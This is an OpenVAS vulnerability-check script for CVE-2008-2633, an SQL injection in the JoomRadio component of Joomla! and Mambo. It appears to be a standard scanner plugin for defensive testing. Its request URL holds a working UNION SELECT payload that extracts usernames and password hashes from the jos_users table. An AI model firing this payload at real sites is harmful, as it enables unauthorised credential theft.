###############################################################################
# OpenVAS Vulnerability Test
# $Id: joomla_mambo_joomRadio_component_sql_injection.nasl 4970 2017-01-09 15:00:59Z teissa $
#
# Joomla! and Mambo JoomRadio Component 'id' Parameter SQL Injection
# Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The JoomRadio component for Joomla! and Mambo is prone to an SQL-injection
  vulnerability because it fails to sufficiently sanitize user-supplied data
  before using it in an SQL query.

  Exploiting this issue could allow an attacker to compromise the application,
  access or modify data, or exploit latent vulnerabilities in the underlying
  database.";


if (description)
{
 script_id(100007);
 script_version("$Revision: 4970 $");
 script_tag(name:"last_modification", value:"$Date: 2017-01-09 16:00:59 +0100 (Mon, 09 Jan 2017) $");
 script_tag(name:"creation_date", value:"2009-03-02 16:07:07 +0100 (Mon, 02 Mar 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2008-2633");
 script_bugtraq_id(29504);

 script_name("Joomla! and Mambo JoomRadio Component 'id' Parameter SQL Injection Vulnerability");

 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = make_list("/joomla","/cms", cgi_dirs());
foreach d (dir)
{ 
 url = string(d, "/index.php?option=com_joomradio&page=show_video&id=-1%20UNION%20SELECT%20user%28%29,concat%28username,0x3a,password%29,user%28%29,user%28%29,user%28%29,user%28%29,user%28%29%20FROM%20jos_users--");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )exit(0);

 if( egrep(pattern: ".*var message=.*[a-f0-9]{32}", string: buf) )
   {    
    security_message(port:port);
    exit(0);
   }
}
exit(0);
